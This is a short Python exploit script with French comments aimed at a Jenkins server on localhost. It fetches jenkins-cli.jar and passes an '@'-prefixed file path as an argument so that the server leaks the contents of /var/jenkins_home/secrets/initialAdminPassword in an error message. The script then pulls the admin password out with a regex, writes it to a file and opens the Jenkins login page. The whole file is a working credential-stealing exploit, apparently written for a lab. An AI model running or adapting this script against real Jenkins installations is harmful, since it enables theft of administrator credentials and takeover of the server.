import subprocess
import re
import webbrowser 
# Commande pour télécharger jenkins-cli.jar
commande_wget = ["wget", "http://localhost:8080/jnlpJars/jenkins-cli.jar"]

# Exécuter la commande wget pour télécharger jenkins-cli.jar
subprocess.run(commande_wget)

# Exécuter la commande pour obtenir le résultat avec la vulnérabilité
result = subprocess.run(['sudo', 'java', '-jar', 'jenkins-cli.jar', '-noCertificateCheck', '-s', 'http://localhost:8080/', 'who-am-i', '@/var/jenkins_home/secrets/initialAdminPassword'], stderr=subprocess.PIPE, text=True)

# Convertir la sortie d'erreur en texte
error_output = result.stderr

# Utiliser une expression régulière pour extraire les caractères recherchés après "ERROR: No argument is allowed:"
pattern = r'ERROR: No argument is allowed: (\w+)'

# Rechercher le motif dans la sortie d'erreur
match = re.search(pattern, error_output)

if match:
    # Récupérer le texte après "ERROR: No argument is allowed:"
    extracted_text = match.group(1)
    print("Résultat récupéré :", extracted_text)
    webbrowser.open_new_tab("http://localhost:8080")
    # Écrire le texte extrait dans un fichier nommé 'mdpADMIN'
    with open('mdpADMIN', 'w') as file:
        file.write(extracted_text)
        print("Texte extrait écrit dans 'mdpADMIN'")
else:
    print("Aucun résultat trouvé.")
                                
